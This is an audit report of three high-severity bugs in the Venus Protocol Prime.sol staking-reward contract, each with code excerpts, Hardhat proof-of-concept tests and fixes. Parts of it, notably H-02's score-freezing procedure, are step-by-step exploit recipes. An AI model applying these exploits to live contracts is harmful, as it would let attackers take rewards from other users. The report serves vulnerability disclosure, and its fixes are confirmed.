[H-01] Prime.sol - User can claim Prime token without having any staked XVS, because hisstakedAtisn’t reset whenever he is issued an irrevocable token
Submitted bydeth, also found byrokinot,gkrastenov,merlin,Testerbot,0xDetermination,3agle,aycozynfada,Flora,KrisApostolov,berlin-101,santipu_,twicek,sl1,0xpiken,Brenzee,rvierdiiev,tapir,HChang26,Satyam_Sharma,mahdirostami, andsaid
Whenever a new Prime token is created, the usersstakedAtis reset to 0. This happens when the userclaima revocable token and when he isissuea revocable token, but it does not happen when a user isissuean irrevocable token.
This isissue()
functionissue(boolisIrrevocable,address[]calldatausers)external{_checkAccessAllowed("issue(bool,address[])");if(isIrrevocable) {for(uint256i=0;i<users.length; ) {TokenstorageuserToken=tokens[users[i]];if(userToken.exists&& !userToken.isIrrevocable) {_upgrade(users[i]);}else{// We don't reset here._mint(true,users[i]);_initializeMarkets(users[i]);}unchecked{i++;}}}else{for(uint256i=0;i<users.length; ) {_mint(false,users[i]);_initializeMarkets(users[i]);// We reset stakedAt heredeletestakedAt[users[i]];unchecked{i++;}}}}
We can see that when a revocable token is issued and minted the user’sstakedAtis reset to 0. Whenever a user’s token is upgraded, hisstakedAthas already been reset to 0 insideclaim.
functionclaim()external{if(stakedAt[msg.sender] ==0)revertIneligibleToClaim();if(block.timestamp-stakedAt[msg.sender] <STAKING_PERIOD)revertWaitMoreTime();// We reset stakedAt herestakedAt[msg.sender] =0;_mint(false,msg.sender);_initializeMarkets(msg.sender);}
The only one time when we don’t reset the user’sstakedAtand it’s when he is issued an irrevocable token.
Let’s see an example and see why this is a problem:
Alice deposits 10k XVS.The protocol/DAO/admin decides to issue Alice an irrevocable prime token, because she deposited such a large amount of tokens. Keep in mind that the 90 day staking period still hasn’t passed and herstakedAtis the original time that she deposited 10k XVS.Time passes and Alice decides to withdraw her entire XVS, so now she has 0 XVS. Her token isn’t burned as she has an irrevocable token.Even more time passes and the protocol/DAO/admin decides to burn Alice’s irrevocable token because she is inactive.EVEN more time passes and Alice returns to the protocol and instead of depositing anything, she callsclaim.
Her tx goes through, since herstakedAtwasn’t reset to 0 when she got issued her irrevocable token.
This way, Alice claimed a revocable token without having any XVS staked in the contract.
Proof of Concept
Add the following line at the top oftests/hardhat/Prime/Prime.ts. We’ll use this to simulate time passing
import{time}from"@nomicfoundation/hardhat-network-helpers";
Paste the following insidetests/hardhat/Prime/Prime.tsand runnpx hardhat test tests/hardhat/Prime/Prime.ts.
it.only("User can get Prime token without any XVS staked",async()=>{// User1 deposits 10k XVSawaitxvs.transfer(awaituser1.getAddress(),parseUnits("10000",18));awaitxvs.connect(user1).approve(xvsVault.address,parseUnits("10000",18));awaitxvsVault.connect(user1).deposit(xvs.address,0,parseUnits("10000",18));letuserInfo=awaitxvsVault.getUserInfo(xvs.address,0,user1.getAddress());expect(userInfo.amount).to.eq(parseUnits("10000",18));// Venus decides to issue an irrevocable Prime token to User1 for staking such a large amount.// Note that the 90 day staking period still hasn't passedawaitprime.issue(true, [user1.getAddress()]);lettoken=awaitprime.tokens(user1.getAddress());expect(token.exists).to.be.equal(true);expect(token.isIrrevocable).to.be.equal(true);// User1 withdraws her entire balance XVSawaitxvsVault.connect(user1).requestWithdrawal(xvs.address,0,parseUnits("10000",18));userInfo=awaitxvsVault.getUserInfo(xvs.address,0,user1.getAddress());expect(userInfo.pendingWithdrawals).to.eq(parseUnits("10000",18));// User1's Prime token gets burned by protocolawaitprime.burn(user1.getAddress());token=awaitprime.tokens(user1.getAddress());expect(token.exists).to.be.equal(false);expect(token.isIrrevocable).to.be.equal(false);// 100 days passawaittime.increase(8640000);// User1 can claim a revocable Prime token without any XVS staked, because his stakedAt wasn't reset to 0expect(prime.stakedAt(awaituser1.getAddress())).to.not.be.equal(0);awaitprime.connect(user1).claim();token=awaitprime.tokens(user1.getAddress());expect(token.exists).to.be.equal(true);expect(token.isIrrevocable).to.be.equal(false);});
If you are having trouble running the test, this change might fix it. InsidePrime.sol,burn()remove the access control from the function. This doesn’t change the attack and the test outcome.
functionburn(addressuser)external{// _checkAccessAllowed("burn(address)");_burn(user);}
Tools Used
Hardhat
Recommended Mitigation Steps
Reset the user’sstakedAtwhenever he is issued an irrevocable token.
functionissue(boolisIrrevocable,address[]calldatausers)external{_checkAccessAllowed("issue(bool,address[])");if(isIrrevocable) {for(uint256i=0;i<users.length; ) {TokenstorageuserToken=tokens[users[i]];if(userToken.exists&& !userToken.isIrrevocable) {_upgrade(users[i]);}else{_mint(true,users[i]);_initializeMarkets(users[i]);deletestakedAt[users[i]];}...
chechu (Venus) confirmed and commented:
Fixedhere.
0xDjango (Judge) commented:
Valid issue with serious impact to the protocol.

[H-02] A malicious user can avoid unfavorable score updates after alpha/multiplier changes, resulting in accrual of outsized rewards for the attacker at the expense of other users
Submitted by0xDetermination, also found byhals,Testerbot,bin2chen,Pessimistic,rokinot, ThreeSigma (1,2),ether_sky,PwnStars,neumo,DeFiHackLabs,turvy_fuzz,Norah,dirk_y,deadrxsezzz,blutorque,SpicyMeatball,seerether, andsaid
https://github.com/code-423n4/2023-09-venus/blob/main/contracts/Tokens/Prime/Prime.sol#L397-L405
https://github.com/code-423n4/2023-09-venus/blob/main/contracts/Tokens/Prime/Prime.sol#L704-L756
https://github.com/code-423n4/2023-09-venus/blob/main/contracts/Tokens/Prime/Prime.sol#L623-L639
https://github.com/code-423n4/2023-09-venus/blob/main/contracts/Tokens/Prime/Prime.sol#L827-L833
https://github.com/code-423n4/2023-09-venus/blob/main/contracts/Tokens/Prime/Prime.sol#L200-L219
https://github.com/code-423n4/2023-09-venus/blob/main/tests/hardhat/Prime/Prime.ts#L294-L301
Please note: All functions/properties referred to are in thePrime.solcontract.
Impact
A malicious user can accrue outsized rewards at the expense of other users afterupdateAlpha()orupdateMultipliers()is called.
Proof of Concept
An attacker can prevent their score from being updated and decreased after the protocol’s alpha or multipliers change. This is done by manipulatively decreasing the value ofpendingScoreUpdates, then ensuring that only other user scores are updated untilpendingScoreUpdatesreaches zero, at which point calls toupdateScores()will revert with the errorNoScoreUpdatesRequired(). This can be done via the attacker callingupdateScores()to update other users’ scores first and/or DoSing calls toupdateScores()that would update the attacker’s score (see the issue titled “DoS and gas griefing of Prime.updateScores()”).
The core of this vulnerability is the attacker’s ability to manipulatependingScoreUpdates. Notice below thatclaim(), which is called to mint a user’s Prime token, doesn’t change the value ofpendingScoreUpdates:
function claim() external {if (stakedAt[msg.sender] == 0) revert IneligibleToClaim();if (block.timestamp - stakedAt[msg.sender] < STAKING_PERIOD) revert WaitMoreTime();stakedAt[msg.sender] = 0;_mint(false, msg.sender);_initializeMarkets(msg.sender);}function _mint(bool isIrrevocable, address user) internal {if (tokens[user].exists) revert IneligibleToClaim();tokens[user].exists = true;tokens[user].isIrrevocable = isIrrevocable;if (isIrrevocable) {totalIrrevocable++;} else {totalRevocable++;}if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();emit Mint(user, isIrrevocable);}function _initializeMarkets(address account) internal {address[] storage _allMarkets = allMarkets;for (uint256 i = 0; i < _allMarkets.length; ) {address market = _allMarkets[i];accrueInterest(market);interests[market][account].rewardIndex = markets[market].rewardIndex;uint256 score = _calculateScore(market, account);interests[market][account].score = score;markets[market].sumOfMembersScore = markets[market].sumOfMembersScore + score;unchecked {i++;}}}
However, burning a token decrementspendingScoreUpdates. (Burning a token is done by withdrawing XVS fromXVSVault.solso that the resulting amount staked is below the minimum amount required to possess a Prime token.) Notice below:
function _burn(address user) internal {..._updateRoundAfterTokenBurned(user);emit Burn(user);}function _updateRoundAfterTokenBurned(address user) internal {if (totalScoreUpdatesRequired > 0) totalScoreUpdatesRequired--;if (pendingScoreUpdates > 0 && !isScoreUpdated[nextScoreUpdateRoundId][user]) {pendingScoreUpdates--;}}
To inappropriately decrement the value ofpendingScoreUpdates, the attacker can backrun the transaction updating the alpha/multiplier, minting and burning a Prime token (this requires the attacker to have staked the minimum amount of XVS 90 days in advance). If the number of Prime tokens minted is often at the max number of Prime tokens minted, the attacker could burn an existing token and then mint and burn a new one. Since the value of!isScoreUpdated[nextScoreUpdateRoundId][user]is default false, pendingScoreUpdates will be inappropriately decremented if the burned token was minted after the call toupdateMultipliers()/updateAlpha().
As aforementioned, the attacker can ensure that only other users’ scores are updated untilpendingScoreUpdatesreaches zero, at which point further calls toupdateScoreswill revert with the custom errorNoScoreUpdatesRequired().
Relevant code fromupdateScores()for reference:
function updateScores(address[] memory users) external {if (pendingScoreUpdates == 0) revert NoScoreUpdatesRequired();if (nextScoreUpdateRoundId == 0) revert NoScoreUpdatesRequired();for (uint256 i = 0; i < users.length; ) {...pendingScoreUpdates--;isScoreUpdated[nextScoreUpdateRoundId][user] = true;unchecked {i++;}emit UserScoreUpdated(user);}}
As seen, the attacker’s score can avoid being updated. This is signficant if a change in multiplier or alpha would decrease the attacker’s score. Because rewards are distributed according to the user’s score divided by the total score, the attacker can ‘freeze’ their score at a higher than appropriate value and accrue increased rewards at the cost of the other users in the market.
The attacker can also prevent score updates for other users. The attacker can ‘freeze’ a user’s score that would otherwise increase after the alpha/multiplier changes, resulting in even greater rewards accrued for the attacker and denied from other users. This is because it is possible to decrease the value ofpendingScoreUpdatesby more than one if the attacker mints and burns more than one token after the alpha/multiplier is updated.
Math to support that a larger score results in greater reward accrual
Let $a$ represent the attacker’s score if it is properly updated after a change in alpha/multiplier, $b$ represent the properly updated total score, and $c$ represent the difference between the attacker’s larger unupdated score and the attacker’s smaller updated score. Clearly $a$, $b$, and $c$ are positive with $a < b$. Consider the following inequality, which holds true since $a \< b$ :
$`\frac{a+c}{b+c} > \frac{a}{b} \iff a+c > \frac{a(b+c)}{b} \iff a+c > a+\frac{ac}{b}$
Test
Paste and run the below test in the ‘mint and burn’ scenario in Prime.ts (line 302)
it("prevent_Update", async () => { //test to show attacker can arbitrarily prevent multiple users from being updated by `updateScores()`//setup 3 usersawait prime.issue(false, [user1.getAddress(), user2.getAddress(), user3.getAddress()]);await xvs.connect(user1).approve(xvsVault.address, bigNumber18.mul(1000));await xvsVault.connect(user1).deposit(xvs.address, 0, bigNumber18.mul(1000));await xvs.connect(user2).approve(xvsVault.address, bigNumber18.mul(1000));await xvsVault.connect(user2).deposit(xvs.address, 0, bigNumber18.mul(1000));await xvs.connect(user3).approve(xvsVault.address, bigNumber18.mul(1000));await xvsVault.connect(user3).deposit(xvs.address, 0, bigNumber18.mul(1000));//attacker sets up addresses to mint/burn and manipulate pendingScoreUpdatesconst [,,,,user4,user5] = await ethers.getSigners();await xvs.transfer(user4.address, bigNumber18.mul(1000000));await xvs.transfer(user5.address, bigNumber18.mul(1000000));await xvs.connect(user4).approve(xvsVault.address, bigNumber18.mul(1000));await xvsVault.connect(user4).deposit(xvs.address, 0, bigNumber18.mul(1000));await xvs.connect(user5).approve(xvsVault.address, bigNumber18.mul(1000));await xvsVault.connect(user5).deposit(xvs.address, 0, bigNumber18.mul(1000));await mine(90 * 24 * 60 * 60);//change alpha, pendingScoreUpdates changed to 3await prime.updateAlpha(1, 5);//attacker backruns alpha update with minting and burning tokens, decreasing pendingScoreUpdates by 2await prime.connect(user4).claim();await xvsVault.connect(user4).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));await prime.connect(user5).claim();await xvsVault.connect(user5).requestWithdrawal(xvs.address, 0, bigNumber18.mul(1000));//attacker updates user 3, decreasing pendingScoreUpdates by 1await prime.connect(user1).updateScores([user3.getAddress()])//users 1 and 2 won't be updated because pendingScoreUpdates is 0await expect(prime.updateScores([user1.getAddress(), user2.getAddress()])).to.be.revertedWithCustomError(prime, "NoScoreUpdatesRequired");});
Tools Used
Hardhat
Recommended Mitigation Steps
Check ifpendingScoreUpdatesis nonzero when a token is minted, and increment it if so. This removes the attacker’s ability to manipulatependingScoreUpdates.
function _mint(bool isIrrevocable, address user) internal {if (tokens[user].exists) revert IneligibleToClaim();tokens[user].exists = true;tokens[user].isIrrevocable = isIrrevocable;if (isIrrevocable) { //@GastotalIrrevocable++;} else {totalRevocable++;}if (totalIrrevocable > irrevocableLimit || totalRevocable > revocableLimit) revert InvalidLimit();+       if (pendingScoreUpdates != 0) {unchecked{++pendingScoreUpdates;}}emit Mint(user, isIrrevocable);}
Further Considerations
The call toupdateMultipliers()can be frontrun by the attacker with staking XVS and/or lending/borrowing transactions in order to increase the attacker’s score before ‘freezing’ it.
If the attacker wants to keep the inflated score, no actions that update the attacker’s score can be taken. However, the attacker can claim the outsized rewards earned at any time and as often as desired sinceclaimInterest()does not update user scores.
If anyone has knowledge that the exploit has occurred, it is possible for any user’s score in a market to be updated with a call toaccrueInterestAndUpdateScore(), which can neutralize the attack.
The required amount of XVS staked for this exploit can be reduced by 1000 if this exploit is combined with the exploit titled “Irrevocable token holders can instantly mint a revocable token after burning and bypass the minimum XVS stake for revocable tokens”.
chechu (Venus) confirmed and commented:
Fixedhere.

[H-03] Incorrect decimal usage in score calculation leads to reduced user reward earnings
Submitted byBrenzee, also found byTesterbot,0xDetermination,santipu_,ast3ros,ether_sky,sces60107,pep7siup,Breeje,tapir, 0xTheC0der (1,2), andSpicyMeatball
Users earned rewards are calculated incorrectly because of the incorrect decimals value used to calculate user’sscoreand marketssumOfMembersScore, which impacts thedeltathat is added to market’srewardIndexwhenPrime.accrueInterestfunction is called.
Proof of Concept
All users rewards are calculated with the following formula:
rewards = (rewardIndex - userRewardIndex) * scoreOfUser;
This means that for user to earn rewards, market’srewardIndexneeds to periodically increase.
markets[vToken].rewardIndexis updated (increased), whenPrime.accrueInterestis called.
Prime.sol:L583-L588
uint256delta;if(markets[vToken].sumOfMembersScore>0) {delta= ((distributionIncome*EXP_SCALE) /markets[vToken].sumOfMembersScore);}markets[vToken].rewardIndex=markets[vToken].rewardIndex+delta;
From the code snippet above it is assumed thatmarkets[vToken].sumOfMembersScoreis precision of 18 decimals.
To ensure that user’sscoreand marketssumOfMemberScoreare correctly calculated, inPrime._calculateScorefunctioncapitalis adjusted to 18 decimals. After thatcapitalis used inScores.calculateScorefunction.
Note:capitalprecision from_capitalForScorefunction is in precision ofunderlying token decimals.
Prime.sol:660-L663
(uint256capital, , ) =_capitalForScore(xvsBalanceForScore,borrow,supply,market);capital=capital* (10** (18-vToken.decimals()));returnScores.calculateScore(xvsBalanceForScore,capital,alphaNumerator,alphaDenominator);
The mistake is made whenvToken.decimals()is used instead ofvToken.underlying().decimals().
To prove that this is the case, here are vTokens deployed on Binance Smart chain, their decimals and underlying token decimals:
vTokenvToken decimalsUnderlying token decimalsvUSDC818vETH818vBNB818vBTC818vUSDT818
SincevToken.decimals()is used, this means the precision ofcapitalis18 + (18 - 8) = 28decimals instead of 18 decimals, which makes thescorecalculation fromScore.calculateScorefunction incorrect, since the function expectscapitalto be in precision of 18 decimals.
As a result,deltafor market’srewardIndexis incorrectly calculated and it can be 0 even though it shouldn’t be, which means that users will not accrue any rewards.
Update current test with correct decimals for vTokens
Developers have made a mistake when writing the tests forPrime.sol- in the tests they have set vToken decimals to 18 instead of 8, which makes the tests pass, but on the Binance Smart Chain all of the vToken decimals are 8.
If the decimal value of vToken is set to 8 in the tests, then the tests will fail.
Change thevusdt,vethandvbnbdecimals to 8 and run:
npx hardhattesttests/hardhat/Prime/*.ts tests/hardhat/integration/index.ts
This will make the current tests fail.
PoC Test
Here is a test where it shows, thatrewardIndexis still 0 afterPrime.accrueInterestis called, even though it should be > 0.
PoC testTo run the following test:CreatePoC.tsfile under thetests/hardhat/Primepath.Copy the code below and paste it into thePoC.tsfile.Runnpx hardhat test tests/hardhat/Prime/PoC.tsimport{FakeContract,MockContract,smock}from"@defi-wonderland/smock";import{loadFixture,mine}from"@nomicfoundation/hardhat-network-helpers";importchaifrom"chai";import{BigNumber,Signer}from"ethers";import{ethers,upgrades}from"hardhat";import{convertToUnit}from"../../../helpers/utils";import{BEP20Harness,ComptrollerLens,ComptrollerLens__factory,ComptrollerMock,ComptrollerMock__factory,IAccessControlManager,IProtocolShareReserve,InterestRateModelHarness,PrimeLiquidityProvider,PrimeScenario,ResilientOracleInterface,VBep20Harness,XVS,XVSStore,XVSVault,XVSVaultScenario,}from"../../../typechain";const{expect} =chai;chai.use(smock.matchers);exportconstbigNumber18=BigNumber.from("1000000000000000000");// 1e18exportconstbigNumber16=BigNumber.from("10000000000000000");// 1e16exportconstvTokenDecimals=BigNumber.from(8);typeSetupProtocolFixture= {oracle:FakeContract<ResilientOracleInterface>;accessControl:FakeContract<IAccessControlManager>;comptrollerLens:MockContract<ComptrollerLens>;comptroller:MockContract<ComptrollerMock>;usdt:BEP20Harness;vusdt:VBep20Harness;eth:BEP20Harness;veth:VBep20Harness;xvsVault:XVSVaultScenario;xvs:XVS;xvsStore:XVSStore;prime:PrimeScenario;protocolShareReserve:FakeContract<IProtocolShareReserve>;primeLiquidityProvider:PrimeLiquidityProvider;};asyncfunctiondeployProtocol():Promise<SetupProtocolFixture> {const[wallet,user1,user2,user3] =awaitethers.getSigners();constoracle=awaitsmock.fake<ResilientOracleInterface>("ResilientOracleInterface");constprotocolShareReserve=awaitsmock.fake<IProtocolShareReserve>("IProtocolShareReserve");constaccessControl=awaitsmock.fake<IAccessControlManager>("AccessControlManager");accessControl.isAllowedToCall.returns(true);constComptrollerLensFactory=awaitsmock.mock<ComptrollerLens__factory>("ComptrollerLens");constComptrollerFactory=awaitsmock.mock<ComptrollerMock__factory>("ComptrollerMock");constcomptroller=awaitComptrollerFactory.deploy();constcomptrollerLens=awaitComptrollerLensFactory.deploy();awaitcomptroller._setAccessControl(accessControl.address);awaitcomptroller._setComptrollerLens(comptrollerLens.address);awaitcomptroller._setPriceOracle(oracle.address);awaitcomptroller._setLiquidationIncentive(convertToUnit("1",18));awaitprotocolShareReserve.MAX_PERCENT.returns("100");consttokenFactory=awaitethers.getContractFactory("BEP20Harness");constusdt= (awaittokenFactory.deploy(bigNumber18.mul(100000000),"usdt",BigNumber.from(18),"BEP20 usdt",))asBEP20Harness;consteth= (awaittokenFactory.deploy(bigNumber18.mul(100000000),"eth",BigNumber.from(18),"BEP20 eth",))asBEP20Harness;constwbnb= (awaittokenFactory.deploy(bigNumber18.mul(100000000),"wbnb",BigNumber.from(18),"BEP20 wbnb",))asBEP20Harness;constinterestRateModelHarnessFactory=awaitethers.getContractFactory("InterestRateModelHarness");constInterestRateModelHarness= (awaitinterestRateModelHarnessFactory.deploy(BigNumber.from(18).mul(5),))asInterestRateModelHarness;constvTokenFactory=awaitethers.getContractFactory("VBep20Harness");constvusdt= (awaitvTokenFactory.deploy(usdt.address,comptroller.address,InterestRateModelHarness.address,bigNumber18,"VToken usdt","vusdt",vTokenDecimals,wallet.address,))asVBep20Harness;constveth= (awaitvTokenFactory.deploy(eth.address,comptroller.address,InterestRateModelHarness.address,bigNumber18,"VToken eth","veth",vTokenDecimals,wallet.address,))asVBep20Harness;constvbnb= (awaitvTokenFactory.deploy(wbnb.address,comptroller.address,InterestRateModelHarness.address,bigNumber18,"VToken bnb","vbnb",vTokenDecimals,wallet.address,))asVBep20Harness;//0.2 reserve factorawaitveth._setReserveFactor(bigNumber16.mul(20));awaitvusdt._setReserveFactor(bigNumber16.mul(20));oracle.getUnderlyingPrice.returns((vToken:string)=>{if(vToken==vusdt.address) {returnconvertToUnit(1,18);}elseif(vToken==veth.address) {returnconvertToUnit(1200,18);}});oracle.getPrice.returns((token:string)=>{if(token==xvs.address) {returnconvertToUnit(3,18);}});consthalf=convertToUnit("0.5",18);awaitcomptroller._supportMarket(vusdt.address);awaitcomptroller._setCollateralFactor(vusdt.address,half);awaitcomptroller._supportMarket(veth.address);awaitcomptroller._setCollateralFactor(veth.address,half);awaiteth.transfer(user1.address,bigNumber18.mul(100));awaitusdt.transfer(user2.address,bigNumber18.mul(10000));awaitcomptroller._setMarketSupplyCaps([vusdt.address,veth.address], [bigNumber18.mul(10000),bigNumber18.mul(100)]);awaitcomptroller._setMarketBorrowCaps([vusdt.address,veth.address], [bigNumber18.mul(10000),bigNumber18.mul(100)]);constxvsFactory=awaitethers.getContractFactory("XVS");constxvs:XVS= (awaitxvsFactory.deploy(wallet.address))asXVS;constxvsStoreFactory=awaitethers.getContractFactory("XVSStore");constxvsStore:XVSStore= (awaitxvsStoreFactory.deploy())asXVSStore;constxvsVaultFactory=awaitethers.getContractFactory("XVSVaultScenario");constxvsVault:XVSVaultScenario= (awaitxvsVaultFactory.deploy())asXVSVaultScenario;awaitxvsStore.setNewOwner(xvsVault.address);awaitxvsVault.setXvsStore(xvs.address,xvsStore.address);awaitxvsVault.setAccessControl(accessControl.address);awaitxvs.transfer(xvsStore.address,bigNumber18.mul(1000));awaitxvs.transfer(user1.address,bigNumber18.mul(1000000));awaitxvs.transfer(user2.address,bigNumber18.mul(1000000));awaitxvs.transfer(user3.address,bigNumber18.mul(1000000));awaitxvsStore.setRewardToken(xvs.address,true);constlockPeriod=300;constallocPoint=100;constpoolId=0;constrewardPerBlock=bigNumber18.mul(1);awaitxvsVault.add(xvs.address,allocPoint,xvs.address,rewardPerBlock,lockPeriod);constprimeLiquidityProviderFactory=awaitethers.getContractFactory("PrimeLiquidityProvider");constprimeLiquidityProvider=awaitupgrades.deployProxy(primeLiquidityProviderFactory,[accessControl.address, [xvs.address,usdt.address,eth.address], [10,10,10]],{},);constprimeFactory=awaitethers.getContractFactory("PrimeScenario");constprime:PrimeScenario=awaitupgrades.deployProxy(primeFactory,[xvsVault.address,xvs.address,0,1,2,accessControl.address,protocolShareReserve.address,primeLiquidityProvider.address,comptroller.address,oracle.address,10,],{constructorArgs:[wbnb.address,vbnb.address,10512000],unsafeAllow:["constructor"],},);awaitxvsVault.setPrimeToken(prime.address,xvs.address,poolId);awaitprime.setLimit(1000,1000);awaitprime.addMarket(vusdt.address,bigNumber18.mul("1"),bigNumber18.mul("1"));awaitprime.addMarket(veth.address,bigNumber18.mul("1"),bigNumber18.mul("1"));awaitcomptroller._setPrimeToken(prime.address);awaitprime.togglePause();return{oracle,comptroller,comptrollerLens,accessControl,usdt,vusdt,eth,veth,xvsVault,xvs,xvsStore,prime,protocolShareReserve,primeLiquidityProvider,};}describe("PoC", ()=>{letdeployer:Signer;letuser1:Signer;letuser2:Signer;letuser3:Signer;letcomptroller:MockContract<ComptrollerMock>;letprime:PrimeScenario;letvusdt:VBep20Harness;letveth:VBep20Harness;letusdt:BEP20Harness;leteth:BEP20Harness;letxvsVault:XVSVault;letxvs:XVS;letoracle:FakeContract<ResilientOracleInterface>;letprotocolShareReserve:FakeContract<IProtocolShareReserve>;letprimeLiquidityProvider:PrimeLiquidityProvider;letvbnb:VBep20Harness;letbnb:BEP20Harness;before(async()=>{[deployer,user1,user2,user3] =awaitethers.getSigners();({comptroller,prime,vusdt,veth,usdt,eth,xvsVault,xvs,oracle,protocolShareReserve,primeLiquidityProvider,} =awaitloadFixture(deployProtocol));awaitprotocolShareReserve.getUnreleasedFunds.returns("0");awaitprotocolShareReserve.getPercentageDistribution.returns("100");awaitxvs.connect(user1).approve(xvsVault.address,bigNumber18.mul(10000));awaitxvsVault.connect(user1).deposit(xvs.address,0,bigNumber18.mul(10000));awaitmine(90*24*60*60);awaitprime.connect(user1).claim();awaitxvs.connect(user2).approve(xvsVault.address,bigNumber18.mul(100));awaitxvsVault.connect(user2).deposit(xvs.address,0,bigNumber18.mul(100));awaiteth.connect(user1).approve(veth.address,bigNumber18.mul(90));awaitveth.connect(user1).mint(bigNumber18.mul(90));awaitusdt.connect(user2).approve(vusdt.address,bigNumber18.mul(9000));awaitvusdt.connect(user2).mint(bigNumber18.mul(9000));awaitcomptroller.connect(user1).enterMarkets([vusdt.address,veth.address]);awaitcomptroller.connect(user2).enterMarkets([vusdt.address,veth.address]);awaitvusdt.connect(user1).borrow(bigNumber18.mul(5));awaitveth.connect(user2).borrow(bigNumber18.mul(1));consttokenFactory=awaitethers.getContractFactory("BEP20Harness");bnb= (awaittokenFactory.deploy(bigNumber18.mul(100000000),"bnb",BigNumber.from(18),"BEP20 bnb",))asBEP20Harness;constinterestRateModelHarnessFactory=awaitethers.getContractFactory("InterestRateModelHarness");constInterestRateModelHarness= (awaitinterestRateModelHarnessFactory.deploy(BigNumber.from(18).mul(5),))asInterestRateModelHarness;constvTokenFactory=awaitethers.getContractFactory("VBep20Harness");vbnb= (awaitvTokenFactory.deploy(bnb.address,comptroller.address,InterestRateModelHarness.address,bigNumber18,"VToken bnb","vbnb",BigNumber.from(8),deployer.getAddress(),))asVBep20Harness;awaitvbnb._setReserveFactor(bigNumber16.mul(20));awaitprimeLiquidityProvider.initializeTokens([bnb.address]);oracle.getUnderlyingPrice.returns((vToken:string)=>{if(vToken==vusdt.address) {returnconvertToUnit(1,18);}elseif(vToken==veth.address) {returnconvertToUnit(1200,18);}elseif(vToken==vbnb.address) {returnconvertToUnit(300,18);}});oracle.getPrice.returns((token:string)=>{if(token==xvs.address) {returnconvertToUnit(3,18);}});consthalf=convertToUnit("0.5",8);awaitcomptroller._supportMarket(vbnb.address);awaitcomptroller._setCollateralFactor(vbnb.address,half);bnb.transfer(user3.getAddress(),bigNumber18.mul(100));awaitcomptroller._setMarketSupplyCaps([vbnb.address], [bigNumber18.mul(100)]);awaitcomptroller._setMarketBorrowCaps([vbnb.address], [bigNumber18.mul(100)]);awaitbnb.connect(user3).approve(vbnb.address,bigNumber18.mul(90));awaitvbnb.connect(user3).mint(bigNumber18.mul(90));awaitvbnb.connect(user2).borrow(bigNumber18.mul(1));awaitcomptroller._setPrimeToken(prime.address);});it("PoC",async()=>{constbob=user3;// Bob deposits XVS in the vaultawaitxvs.connect(bob).approve(xvsVault.address,bigNumber18.mul(2000));awaitxvsVault.connect(bob).deposit(xvs.address,0,bigNumber18.mul(2000));awaitprime.issue(false, [bob.getAddress()]);awaitprime.addMarket(vbnb.address,bigNumber18.mul(1),bigNumber18.mul(1));// Bob mints vBNB/deposits BNB. This calls Prime.accrueInterestAndUpdateScoreawaitbnb.connect(bob).approve(vbnb.address,bigNumber18.mul(90));awaitvbnb.connect(bob).mint(bigNumber18.mul(1));letmarket=awaitprime.markets(vbnb.address);// Expect that market.sumOfMembersScore is not 0. This means that the score was updatedexpect(market.sumOfMembersScore).to.not.equal(0);// We make the PSR.getUnreleasedFunds to return 103683. This lets Prime contract know that// there are unreleased funds and rewardIndex should be updated.awaitprotocolShareReserve.getUnreleasedFunds.returns(103683);// Call accrueInterest manually.//// Since there are unreleased funds AND the sumOfMembersScore !== 0,// the reward index should be updated.awaitprime.accrueInterest(vbnb.address);market=awaitprime.markets(vbnb.address);// The reward index should be > 0, but it is not updated.expect(market.rewardIndex).to.equal(0);});});
Recommended Mitigation Steps
Make sure that underlying token decimals are used instead of vToken decimals when calculatingcapitalinPrime._calculateScorefunction.
(uint256capital, , ) =_capitalForScore(xvsBalanceForScore,borrow,supply,market);capital=capital* (10** (18-IERC20Upgradeable(_getUnderlying(market)).decimals()));
chechu (Venus) confirmed via duplicate issue 588 and commented:
Fixed. Seehereandhere
0xDjango (Judge) commented:
Agree with high severity as the core mechanic of interest calculation is incorrect.

